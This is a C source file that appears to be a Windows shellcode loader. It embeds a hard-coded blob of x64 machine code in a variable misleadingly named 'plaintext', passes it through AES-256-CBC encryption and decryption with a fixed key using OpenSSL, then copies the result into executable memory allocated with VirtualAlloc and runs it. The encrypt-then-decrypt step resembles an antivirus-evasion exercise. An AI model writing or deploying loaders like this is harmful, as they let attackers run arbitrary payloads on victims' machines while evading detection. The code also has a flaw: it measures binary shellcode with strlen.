/*
* Download OpenSSL-Win64
* Compilation:  gcc .\main.c C:\Users\super\source\repos\openssl\ms\applink.c -o .\main -IC:\curl\include\ -L"C:\Program Files\OpenSSL-Win64" -l:libcrypto-3-x64.dll -l:libssl-3-x64.dll
*/

// Try this next: https://wiki.openssl.org/index.php/EVP_Symmetric_Encryption_and_Decryption
// Downloadable version: https://wiki.openssl.org/images/1/17/Evp-symmetric-encrypt.c

/*
This implements CBC mode; 256 bit key, 128 bit IV --> These have to be exact.

*/

#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <string.h>
#include <openssl/bio.h>
#include <Windows.h>

unsigned char * plaintext = (unsigned char *) "\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\x90\x71\xdd\x74\x0b\xc9\xf4\x0e\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x6c\x39\x5e"
"\x90\xfb\x21\x38\x0e\x90\x71\x9c\x25\x4a\x99\xa6\x46\xa1"
"\xa3\xb8\x3c\x80\x9b\x94\x46\x1b\x23\xc5\x25\x5d\x81\x7f"
"\x5c\xb0\x39\xd2\xc3\x41\x83\xbc\x85\xe2\x21\x90\x45\xc2"
"\x81\xc5\xce\x3c\x4d\xbc\x08\x09\xe5\xd4\x4f\x51\xb8\xd0"
"\x35\x0a\x08\x16\xe3\xc2\x39\x56\x26\x2b\x42\xb6\x32\xd8"
"\x70\x0d\x35\x5a\xaf\x75\x76\x88\x7a\xdf\x7b\x8e\xbb\xf4"
"\x0e\x90\xfa\x5d\xfc\x0b\xc9\xf4\x46\x15\xb1\xa9\x13\x43"
"\xc8\x24\x85\xd8\x69\x99\xff\x4b\xe9\xbd\x0f\x40\x21\x3e"
"\x22\x46\xf8\x3d\x46\x6f\xb8\x9c\xff\x3f\x41\xbc\x0f\x46"
"\x39\xec\xb4\x4a\x08\x3d\x03\x3c\x30\xdc\xb5\x33\x29\x81"
"\xff\xdc\x72\x91\x50\x03\x8c\xcd\xdf\xe5\xa9\x85\x30\x80"
"\x89\xd0\x47\x91\xa1\xbb\x35\x80\xc5\xbc\x4a\x1b\x31\xc1"
"\x3d\x0a\x19\xb5\x85\x94\xf9\x9c\x2c\x4a\x91\xbc\x0f\x40"
"\x2f\x84\x2e\x4a\x91\xb5\x57\xd1\x2b\x95\xf7\xe7\xe9\xb5"
"\x5c\x6f\x91\x85\x35\x52\x93\xbc\x85\x82\x98\x96\x8b\xf4"
"\x36\xa9\x47\x2e\x06\xae\x46\x54\xfa\xc6\x0e\x90\x30\x8b"
"\x3d\x82\x2f\xbc\x8f\x7c\xd1\xdc\x74\x0b\x80\x7d\xeb\xd9"
"\xcd\xdf\x74\x1a\x95\x34\xa6\x86\x7b\x9c\x20\x42\x40\x10"
"\x42\x19\x80\x9c\xce\x47\xbe\xd2\x09\x6f\xa4\x91\xfd\xe1"
"\xa1\xf5\x0f\x90\x71\x84\x35\xb1\xe0\x74\x65\x90\x8e\x08"
"\x1e\x01\x88\xaa\x5e\xc0\x3c\xec\xbd\x46\xf8\x34\x46\x6f"
"\xb1\x95\xfd\xc9\x81\x0b\xce\xd8\xf8\x1c\x35\xb1\x23\xfb"
"\xd1\x70\x8e\x08\x3c\x82\x0e\x9e\x1e\xd1\x29\x91\xfd\xe9"
"\x81\x7d\xf7\xd1\xcb\x44\xd1\x7f\xa8\x0b\xdb\x15\xb1\xa9"
"\x7e\x42\x36\x3a\x7b\x75\x99\x4e\x74\x0b\xc9\xbc\x8d\x7c"
"\x61\x95\xfd\xe9\x84\xc5\xc7\xfa\x75\x9c\x2c\x43\x40\x0d"
"\x4f\x2a\x73\x04\xbc\x54\x36\x21\x8d\x68\x71\xa3\x21\x43"
"\x4a\x30\x2e\xce\xf8\x2b\x1e\x4b\x88\xad\x66\x90\x61\xdd"
"\x74\x4a\x91\xbc\x87\x62\x39\xec\xbd\x4a\x73\xac\xaa\xc3"
"\x94\x22\xa1\x43\x40\x37\x47\x19\xb6\x90\x45\xc2\x80\x7d"
"\xfe\xd8\xf8\x07\x3c\x82\x30\xb5\xb4\x92\xa8\x15\x2b\xf4"
"\x1c\x77\xf6\x90\x0c\xf5\x2c\x4a\x9e\xad\x66\x90\x31\xdd"
"\x74\x4a\x91\x9e\x0e\xca\x30\x67\x7f\x24\xc6\xc4\xf1\x45"
"\x26\x84\x35\xb1\xbc\x9a\x43\xf1\x8e\x08\x3d\xf4\x07\x1d"
"\x32\x6f\x8e\x22\x3c\x0a\x0a\xbc\x27\x56\x39\x58\x82\x7e"
"\x7d\xb5\xf1\x77\x29\xb7\x74\x52\x80\x33\xcc\x60\xc4\x7f"
"\x22\xf4\x1c\xf4\x0e";

void handleErrors(void);
int encrypt(unsigned char * plaintext, int plaintext_len, unsigned char * key, unsigned char * iv, unsigned char * ciphertext);
int decrypt(unsigned char * ciphertext, int ciphertext_len, unsigned char * key, unsigned char * iv, unsigned char * plaintext);

int main(void) {

    unsigned char key[] = { 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30, 0x31};

    unsigned char iv[] = { 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35 };

    // unsigned char * plaintext = (unsigned char *) "This is the test string being operated upon";

    printf("Initial string: %s\tLength: %ld\n", plaintext, strlen(plaintext));

    unsigned char ciphertext[4096];

    unsigned char decryptedText[4096];

    int decryptedText_length, cipherText_length;

    // This is encrypting the plaintext
    cipherText_length = encrypt(plaintext, strlen((char *)plaintext), key, iv, ciphertext);

    printf("Do I make it here?\n");

    // At this point ciphertext contains the encrypted message
    printf("Ciphertext: \n");

    // This sequence creates a new BIO * from stdout, freeing it afterwards
    
    // BIO * bio;
    // bio = BIO_new_fp(stdout, BIO_NOCLOSE);
    // BIO_dump(bio, (const char *)ciphertext, cipherText_length);
    // BIO_free(bio);
    int counter = 0;
    for (int i = 0; i < cipherText_length; i++) {
        printf("\\x%x", ciphertext[i]);
        counter++;
    }

    // printf("Number of bytes: %d", counter);
    printf("Ciphertext length: %d", cipherText_length);

    decryptedText_length = decrypt(ciphertext, cipherText_length, key, iv, decryptedText);

    decryptedText[decryptedText_length] = '\0';

    printf("Decrypted text: \n");
    printf("%s\tLength: %ld\n", decryptedText, strlen(decryptedText));

	void *exec = VirtualAlloc(0, decryptedText_length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, decryptedText, decryptedText_length);
	((void(*)())exec)();

    return 0;
}

void handleErrors(void) {               // This takes any error messages generated by OpenSSL and outputs them to the console
    ERR_print_errors_fp(stderr);
    abort();
}

int encrypt(unsigned char * plaintext, int plaintext_len, unsigned char * key, unsigned char * iv, unsigned char * ciphertext) {

    EVP_CIPHER_CTX * ctx;

    int len;

    int ciphertext_len;

    if (!(ctx = EVP_CIPHER_CTX_new())) {
        handleErrors();
    }

    // This is initializing the encryption operation
    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv)) {
        handleErrors();
    }

    // This is encrypting the message and leaving the encrypted output in the provided buffer (the last parameter)
    if (1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len)) {
        handleErrors();
    }

    ciphertext_len = len;

    // This is finalizing the encryption and the operation is not complete without it
    if (1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len)) {
        handleErrors();
    }

    ciphertext_len += len;

    // This is cleaning up after the operation that was just performed
    EVP_CIPHER_CTX_free(ctx);

    return ciphertext_len;

}

// Decryption consists of: setting up context, initializing a decryption operation, providing the ciphertext, finalising the operation.

int decrypt(unsigned char * ciphertext, int ciphertext_len, unsigned char * key, unsigned char * iv, unsigned char * plaintext) {

    EVP_CIPHER_CTX * ctx;

    int len, plaintext_len;

    if (!(ctx = EVP_CIPHER_CTX_new())) {
        handleErrors();
    }

    // initializing the decryption operation with a correctly sized key and IV
    if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv)) {
        handleErrors();
    }

    // EVP_DecryptUpdate can be called multiple times if needed
    // This call is placing the plaintext output in the provided buffer (the last parameter)
    if (1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len)) {
        handleErrors();
    }

    plaintext_len = len;

    // This call is finalizing the encryption and this is required for successful decryption; without it bytes may be missing
    if (1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len)) {
        handleErrors();
    }

    plaintext_len += len;

    // This call is cleaning up
    EVP_CIPHER_CTX_free(ctx);

    return plaintext_len;

}